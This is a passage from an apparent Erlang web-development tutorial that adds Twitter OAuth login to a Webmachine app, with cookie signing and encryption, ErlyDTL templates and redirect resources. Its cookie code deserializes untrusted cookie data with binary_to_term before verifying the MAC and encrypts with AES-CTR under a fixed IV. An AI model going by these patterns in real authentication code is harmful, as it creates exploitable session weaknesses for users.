</span><span class='line'>  <span class="nv">SecretInfo</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">({</span><span class="nv">Token</span><span class="p">,</span> <span class="nv">TokenSecret</span><span class="p">}),</span>
</span><span class='line'>  <span class="nv">CookieValue</span> <span class="o">=</span> <span class="p">{</span><span class="nv">Id</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="n">get_expiry</span><span class="p">(),</span> <span class="nv">SecretInfo</span><span class="p">},</span>
</span><span class='line'>  <span class="nn">base64</span><span class="p">:</span><span class="n">encode</span><span class="p">(</span><span class="nb">term_to_binary</span><span class="p">({</span><span class="nv">CookieValue</span><span class="p">,</span> <span class="no">?AUTH_SALT</span><span class="p">,</span> <span class="nn">crypto</span><span class="p">:</span><span class="n">sha_mac</span><span class="p">(</span><span class="no">?AUTH_SECRET</span><span class="p">,</span> <span class="nb">term_to_binary</span><span class="p">([</span><span class="nv">CookieValue</span><span class="p">,</span> <span class="no">?AUTH_SALT</span><span class="p">]))})).</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>encode</code> function is rather self-explanatory. We start by encrypting the OAuth token information, we then generate a tuple which includes all the data we want to keep, convert it to binary and <a href="http://en.wikipedia.org/wiki/Base64" title="Base64">base64</a> encode it.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/cookie.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="nf">decode</span><span class="p">(</span><span class="nv">CookieValue</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="nv">Value</span><span class="o">=</span><span class="p">{</span><span class="nv">Id</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="nv">Expire</span><span class="p">,</span> <span class="nv">SecretInfo</span><span class="p">},</span> <span class="nv">Salt</span><span class="p">,</span> <span class="nv">Sign</span><span class="p">}</span> <span class="o">=</span> <span class="nb">binary_to_term</span><span class="p">(</span><span class="nn">base64</span><span class="p">:</span><span class="n">decode</span><span class="p">(</span><span class="nv">CookieValue</span><span class="p">)),</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">crypto</span><span class="p">:</span><span class="n">sha_mac</span><span class="p">(</span><span class="no">?AUTH_SECRET</span><span class="p">,</span> <span class="nb">term_to_binary</span><span class="p">([</span><span class="nv">Value</span><span class="p">,</span> <span class="nv">Salt</span><span class="p">]))</span> <span class="k">of</span>
</span><span class='line'>    <span class="nv">Sign</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="k">case</span> <span class="nv">Expire</span> <span class="o">&gt;=</span> <span class="nn">calendar</span><span class="p">:</span><span class="n">local_time</span><span class="p">()</span> <span class="k">of</span>
</span><span class='line'>        <span class="n">true</span> <span class="o">-&gt;</span>
</span><span class='line'>          <span class="p">{</span><span class="nv">Token</span><span class="p">,</span> <span class="nv">TokenSecret</span><span class="p">}</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="nv">SecretInfo</span><span class="p">),</span>
</span><span class='line'>          <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">{</span><span class="nv">Id</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="nv">Token</span><span class="p">,</span> <span class="nv">TokenSecret</span><span class="p">}};</span>
</span><span class='line'>        <span class="n">false</span> <span class="o">-&gt;</span>
</span><span class='line'>          <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="n">expired</span><span class="p">}</span>
</span><span class='line'>      <span class="k">end</span><span class="p">;</span>
</span><span class='line'>    <span class="p">_</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="n">invalid</span><span class="p">}</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>decode</code> function does a little more than its counterpart as there&rsquo;s validation built-in as well as decrypting. Firstly we do the inverse of the final steps of the <code>encode</code> function in that we base64 decode the data into binary and convert the resulting binary back to Erlang terms. We then break this value up into its components.</p>

<p>We then validate that the cookie hasn&rsquo;t been tampered with by calculating the <a href="http://en.wikipedia.org/wiki/HMAC" title="HMAC">SHA MAC</a> of the data that was retrieved. If this value doesn&rsquo;t match what is expected we indicate that the value is invalid. If the value is valid, we then make sure that the internal cookie value hasn&rsquo;t expired. If it hasn&rsquo;t, we return <code>{ok, &lt;data&gt;}</code>.</p>

<p>The rest of the functions are easy to understand, so here they are for the sake of completeness without explanation.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/cookie.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="nf">get_expiry</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="nv">Date</span><span class="p">,</span> <span class="nv">Time</span><span class="p">}</span> <span class="o">=</span> <span class="nn">calendar</span><span class="p">:</span><span class="n">local_time</span><span class="p">(),</span>
</span><span class='line'>  <span class="nv">NewDate</span> <span class="o">=</span> <span class="nn">calendar</span><span class="p">:</span><span class="n">gregorian_days_to_date</span><span class="p">(</span><span class="nn">calendar</span><span class="p">:</span><span class="n">date_to_gregorian_days</span><span class="p">(</span><span class="nv">Date</span><span class="p">)</span> <span class="o">+</span> <span class="no">?AUTH_EXPIRY_DAYS</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="nv">NewDate</span><span class="p">,</span> <span class="nv">Time</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">encrypt</span><span class="p">(</span><span class="nv">Value</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">crypto</span><span class="p">:</span><span class="n">aes_ctr_encrypt</span><span class="p">(</span><span class="no">?ENC_KEY</span><span class="p">,</span> <span class="no">?ENC_IV</span><span class="p">,</span> <span class="nb">term_to_binary</span><span class="p">([</span><span class="nv">Value</span><span class="p">,</span> <span class="no">?AUTH_SALT</span><span class="p">])).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">decrypt</span><span class="p">(</span><span class="nv">Value</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">[</span><span class="nv">V</span><span class="p">,</span> <span class="no">?AUTH_SALT</span><span class="p">]</span> <span class="o">=</span> <span class="nb">binary_to_term</span><span class="p">(</span><span class="nn">crypto</span><span class="p">:</span><span class="n">aes_ctr_decrypt</span><span class="p">(</span><span class="no">?ENC_KEY</span><span class="p">,</span> <span class="no">?ENC_IV</span><span class="p">,</span> <span class="nv">Value</span><span class="p">)),</span>
</span><span class='line'>  <span class="nv">V</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Phew! Now that&rsquo;s out of the way we have some back-end glue which we can use to perform some more interesting tasks. One thing that we really need to do is update the landing page template with something more meaningful than what we have now.</p>

<p>We&rsquo;ll start making use of <a href="http://github.com/evanmiller/erlydtl" title="ErlyDTL">ErlyDTL</a>&rsquo;s hierarchical templates and implement a base template which our other templates will also make use of. Here it is in all its simplicity:</p>

<figure class='code'><figcaption><span>apps/csd_web/templates/base.dtl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span><span class='line'><span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">&quot;en&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;head&gt;</span>
</span><span class='line'>    <span class="nt">&lt;title&gt;</span>Code Smackdown - {% block page_title %}{% endblock %}<span class="nt">&lt;/title&gt;</span>
</span><span class='line'>    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js&quot;</span> <span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
</span><span class='line'>    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;http://ajax.microsoft.com/ajax/jquery.templates/beta1/jquery.tmpl.min.js&quot;</span> <span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/head&gt;</span>
</span><span class='line'>  <span class="nt">&lt;body&gt;</span>
</span><span class='line'>    {% block body_content %}{% endblock %}
</span><span class='line'>  <span class="nt">&lt;/body&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>In this template we&rsquo;ve included a couple of Javascript files that we&rsquo;ll be using later on as well as setting up a basic HTML5 page. <code>page_title</code> and <code>body_content</code> are the two sections that child templates can populate with their own content.</p>

<p>With that, let&rsquo;s go ahead and modify our default template so that it has something a little more meaninful in it:</p>

<figure class='code'><figcaption><span>apps/csd_web/templates/home.dtl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>{% extends &#39;base.dtl&#39; %}
</span><span class='line'>
</span><span class='line'>{% block page_title %}Landing Page{% endblock %}
</span><span class='line'>
</span><span class='line'>{% block body_content %}
</span><span class='line'>    <span class="nt">&lt;h1&gt;</span>Welcome to Code Smackdown<span class="nt">&lt;/h1&gt;</span>
</span><span class='line'>    {% if logged_in %}
</span><span class='line'>    <span class="nt">&lt;p&gt;</span>Welcome back {{ user_name }}.<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>    {% else %}
</span><span class='line'>    <span class="nt">&lt;p&gt;</span>We require you to sign in via Twitter<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>    <span class="nt">&lt;p&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;{{ logon_url }}&quot;</span> <span class="na">title=</span><span class="s">&quot;Sign in with Twitter&quot;</span><span class="nt">&gt;&lt;img</span> <span class="na">src=</span><span class="s">&quot;http://si0.twimg.com/images/dev/buttons/sign-in-with-twitter-d.png&quot;</span><span class="nt">/&gt;&lt;/a&gt;&lt;p&gt;</span>
</span><span class='line'>    {% endif %}
</span><span class='line'>{% endblock %}
</span></code></pre></td></tr></table></div></figure>


<p>Nothing sinister going on here, but there are a couple of things worth noting. The template now looks for a field called <code>logged_in</code>, and if it&rsquo;s <code>true</code> it renders a paragraph which contains the value in the <code>user_name</code> field. If the <code>logged_in</code> flag is false a link is provided which points to <code>logon_url</code> which ultimately points the user at the Twitter OAuth entry page.</p>

<p>We&rsquo;ll need to pass these values in when we render the template. Let&rsquo;s have a look at the changed section of <code>csd_web_resource</code>:</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ... %</span>
</span><span class='line'><span class="nf">to_html</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Content</span> <span class="o">=</span> <span class="k">case</span> <span class="nn">cookie</span><span class="p">:</span><span class="n">load_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">{_,</span> <span class="nv">Name</span><span class="p">,</span> <span class="p">_,</span> <span class="p">_}}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nn">csd_view</span><span class="p">:</span><span class="n">home</span><span class="p">(</span><span class="nv">Name</span><span class="p">);</span>
</span><span class='line'>    <span class="p">_</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nn">csd_view</span><span class="p">:</span><span class="n">home</span><span class="p">()</span>
</span><span class='line'>  <span class="k">end</span><span class="p">,</span>
</span><span class='line'>  <span class="p">{</span><span class="nv">Content</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'><span class="c">% ... snip ... %</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yes this is quite a bit different to before. We are calling into our <code>cookie</code> module to find out if the user is logged in. If they are logged on we call <code>csd_view:home</code> with a single parameter <code>Name</code>, if they&rsquo;re not logged on the same function is called without any parameters.</p>

<p>The <code>csd_view</code> module is new and was created to abstract the idea of template rendering. All the ErlyDTL handling happens in <code>csd_view</code>. Let&rsquo;s take a look at it now.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_view.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">%% @author OJ Reeves &lt;oj@buffered.io&gt;</span>
</span><span class='line'><span class="c">%% @copyright 2012 OJ Reeves</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_view</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">home</span><span class="o">/</span><span class="mi">0</span><span class="p">,</span> <span class="n">home</span><span class="o">/</span><span class="mi">1</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">home</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Params</span> <span class="o">=</span> <span class="p">[{</span><span class="n">logged_in</span><span class="p">,</span> <span class="n">false</span><span class="p">},</span> <span class="p">{</span><span class="n">logon_url</span><span class="p">,</span> <span class="nn">conf</span><span class="p">:</span><span class="n">get_val</span><span class="p">(</span><span class="n">urimap</span><span class="p">,</span> <span class="n">twitter_logon</span><span class="p">)}],</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Content</span><span class="p">}</span> <span class="o">=</span> <span class="nn">home_dtl</span><span class="p">:</span><span class="n">render</span><span class="p">(</span><span class="nv">Params</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Content</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">home</span><span class="p">(</span><span class="nv">Name</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Params</span> <span class="o">=</span> <span class="p">[{</span><span class="n">logged_in</span><span class="p">,</span> <span class="n">true</span><span class="p">},</span> <span class="p">{</span><span class="n">user_name</span><span class="p">,</span> <span class="nv">Name</span><span class="p">}],</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Content</span><span class="p">}</span> <span class="o">=</span> <span class="nn">home_dtl</span><span class="p">:</span><span class="n">render</span><span class="p">(</span><span class="nv">Params</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Content</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we can see the two functions called <code>home</code> which were invoked in the <code>csd_web_resource</code> module. Most of this module is simple and uninteresting except for the use of <code>conf:get_val</code>. Templates need to know about paths when generating URLs in the markup. In our case, we&rsquo;re rendering links which point to internal routes which are specified in the dispatch list. Rather than hard-code URLs in the templates I decided to create another section in the <code>app.config</code> called <code>urimap</code>. The goal is to have an easy-to-access location for addresses which lives alongside the routes so that the maintainer of the application can update both at the same time should something need to change. Here&rsquo;s what the new section looks like.</p>

<figure class='code'><figcaption><span>apps/csd_web/priv/app.config (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ... %</span>
</span><span class='line'>  <span class="p">{</span><span class="n">csd_web</span><span class="p">,</span>
</span><span class='line'>    <span class="p">[</span>
</span><span class='line'>      <span class="c">% ... snip ... %</span>
</span><span class='line'>      <span class="p">{</span><span class="n">urimap</span><span class="p">,</span>
</span><span class='line'>        <span class="p">[</span>
</span><span class='line'>          <span class="p">{</span><span class="n">home</span><span class="p">,</span> <span class="s">&quot;/&quot;</span><span class="p">},</span>
</span><span class='line'>          <span class="p">{</span><span class="n">twitter_logon</span><span class="p">,</span> <span class="s">&quot;/oauth/request&quot;</span><span class="p">}</span>
</span><span class='line'>        <span class="p">]</span>
</span><span class='line'>      <span class="p">},</span>
</span><span class='line'>      <span class="c">% ... snip ... %</span>
</span></code></pre></td></tr></table></div></figure>


<p>Accessing a link address is as simple as running <code>conf:get_val(urimap, &lt;link-id&gt;)</code>.</p>

<p>At this point we can build and run the application to see what the landing page looks like. To fire up the application you&rsquo;ll need three consoles:</p>

<ol>
<li>One for Riak. Riak has to be running behind the scenes because <code>Pooler</code> will connect on start. Only one node is necessary at this point. Run: <code>/path/to/riak/dev/dev1/bin/riak start</code></li>
<li>One for HAProxy. Run: <code>make proxystart</code></li>
<li>One for the CSD application. Run: <code>make webstart</code></li>
</ol>


<p>When you browse to <a href="http://127.0.0.1:4000">http://127.0.0.1:4000</a> you should see the following:</p>

<p><img src="http://buffered.io/uploads/2012/02/home-loggedoff.png" title="Home - Logged Off" alt="Landing page when logged off" /></p>

<p>Clicking the link will result in an error at this point, so don&rsquo;t do it yet! We need to implement more resources, but first let&rsquo;s just stick the routes into the dispatch in preparation.</p>

<figure class='code'><figcaption><span>apps/csd_web/priv/app.config (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">{</span><span class="n">csd_web</span><span class="p">,</span>
</span><span class='line'>  <span class="p">[</span>
</span><span class='line'>    <span class="p">{</span><span class="n">web</span><span class="p">,</span>
</span><span class='line'>      <span class="p">[</span>
</span><span class='line'>        <span class="c">% ... snip ... %</span>
</span><span class='line'>        <span class="p">{</span><span class="n">dispatch</span><span class="p">,</span>
</span><span class='line'>          <span class="p">[</span>
</span><span class='line'>            <span class="p">{[],</span> <span class="n">csd_web_resource</span><span class="p">,</span> <span class="p">[]},</span>
</span><span class='line'>            <span class="p">{[</span><span class="s">&quot;snippet&quot;</span><span class="p">,</span> <span class="n">key</span><span class="p">],</span> <span class="n">csd_web_snippet_resource</span><span class="p">,</span> <span class="p">[]},</span>
</span><span class='line'>            <span class="p">{[</span><span class="s">&quot;oauth&quot;</span><span class="p">,</span> <span class="s">&quot;request&quot;</span><span class="p">],</span> <span class="n">csd_web_request_resource</span><span class="p">,</span> <span class="p">[]},</span>  <span class="c">% new route</span>
</span><span class='line'>            <span class="p">{[</span><span class="s">&quot;oauth&quot;</span><span class="p">,</span> <span class="s">&quot;callback&quot;</span><span class="p">],</span> <span class="n">csd_web_callback_resource</span><span class="p">,</span> <span class="p">[]}</span> <span class="c">% new route</span>
</span><span class='line'>          <span class="p">]</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>      <span class="p">]</span>
</span><span class='line'>    <span class="p">},</span>
</span><span class='line'>    <span class="c">% ... snip ... %</span>
</span></code></pre></td></tr></table></div></figure>


<p>Easily done. Now let&rsquo;s look at the implementation of the first handler which handles the <code>/oauth/request</code> URI, <code>csd_web_request_resource</code>.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_request_resource.erl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">%% @author OJ Reeves &lt;oj@buffered.io&gt;</span>
</span><span class='line'><span class="c">%% @copyright 2012 OJ Reeves</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_web_request_resource</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">init</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">resource_exists</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">previously_existed</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">moved_temporarily</span><span class="o">/</span><span class="mi">2</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">include_lib</span><span class="p">(</span><span class="s">&quot;webmachine/include/webmachine.hrl&quot;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">init</span><span class="p">([])</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="n">undefined</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">resource_exists</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">false</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">previously_existed</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">moved_temporarily</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Url</span><span class="p">}</span> <span class="o">=</span> <span class="nn">twitter</span><span class="p">:</span><span class="n">request_access</span><span class="p">(),</span>
</span><span class='line'>  <span class="p">{{</span><span class="n">true</span><span class="p">,</span> <span class="nv">Url</span><span class="p">},</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>This module is quite lightweight, but has a little bit of magic in it that revolves around getting redirects to work. If you&rsquo;re not familiar with how 307 redirects work in Webmachine, take a quick side-glance at my <a href="http://buffered.io/posts/redirects-with-webmachine/" title="Redirects with Webmachine">Redirects with Webmachine</a> post.</p>

<p>Back? Ok. The extra line of code in the <code>moved_temporarily</code> function is where we invoke <code>twitter:request_access()</code> which goes to Twitter.com and gets a request token. The URL generated by this call is then passed back to Webmachine which will tell the caller&rsquo;s browser where to redirect to.</p>

<p>Build the app, fire up it up and click on the &ldquo;Sign in via Twitter&rdquo; button and you should see a screen that resembles this (assuming you&rsquo;re already signed in to Twitter):</p>

<p><img src="http://buffered.io/uploads/2012/02/twitter-logon.png" title="Twitter - Logon Page" alt="Logging into CSD view Twitter" /></p>

<p>Exciting! We&rsquo;re nearly there. Don&rsquo;t click &ldquo;Sign In&rdquo; just yet because we don&rsquo;t yet have the callback set up to handle the result. Let&rsquo;s do that now. Here&rsquo;s the resource:</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_callback_resource.erl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">%% @author OJ Reeves &lt;oj@buffered.io&gt;</span>
</span><span class='line'><span class="c">%% @copyright 2012 OJ Reeves</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_web_callback_resource</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">init</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">resource_exists</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">previously_existed</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">moved_temporarily</span><span class="o">/</span><span class="mi">2</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">include_lib</span><span class="p">(</span><span class="s">&quot;webmachine/include/webmachine.hrl&quot;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">init</span><span class="p">([])</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="n">undefined</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">resource_exists</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">false</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
